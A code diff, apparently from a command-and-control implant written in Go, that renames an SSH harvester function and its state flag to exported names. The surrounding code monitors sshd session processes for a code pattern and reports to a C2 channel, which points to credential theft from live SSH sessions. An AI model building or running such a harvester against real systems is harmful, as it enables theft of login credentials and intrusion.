@@ -23,7 +23,7 @@ import (
 
 var (
 	// mark ssh harvester as running
-	sshHarvesterRunning bool
+	SshHarvesterRunning bool
 
 	// record traced sshd sessions
 	traced_pids     = make(map[int]bool)
@@ -34,8 +34,8 @@ var (
 	SshHarvesterCancel context.CancelFunc
 )
 
-func ssh_harvester(cmd *cobra.Command, code_pattern []byte, reg_name string) (err error) {
-	if sshHarvesterRunning {
+func SshHarvester(cmd *cobra.Command, code_pattern []byte, reg_name string) (err error) {
+	if SshHarvesterRunning {
 		c2transport.C2RespPrintf(cmd, "SSH Harvester already running")
 		return
 	} else {
@@ -44,7 +44,7 @@ func ssh_harvester(cmd *cobra.Command, code_pattern []byte, reg_name string) (er
 	}
 	defer func() {
 		c2transport.C2RespPrintf(cmd, "SSH Harvester (%d) terminated", unix.Getpid())
-		sshHarvesterRunning = false // mark as finished
+		SshHarvesterRunning = false // mark as finished
 	}()
 
 	alive, sshd_procs := util.IsProcAlive("sshd")
@@ -54,7 +54,7 @@ func ssh_harvester(cmd *cobra.Command, code_pattern []byte, reg_name string) (er
 	}
 
 	c2transport.C2RespPrintf(cmd, "SSH harvester started (%d) with code pattern set to 0x%x", unix.Getpid(), code_pattern)
-	sshHarvesterRunning = true // mark as running
+	SshHarvesterRunning = true // mark as running
 	monitor := func(sshd_pid int) {
 		c2transport.C2RespPrintf(cmd, "Started monitor (%d) on SSHD session process (%d), looking for code pattern 0x%x", unix.Getpid(), sshd_pid, code_pattern)
 		defer c2transport.C2RespPrintf(cmd, "Monitor for %d done", sshd_pid)
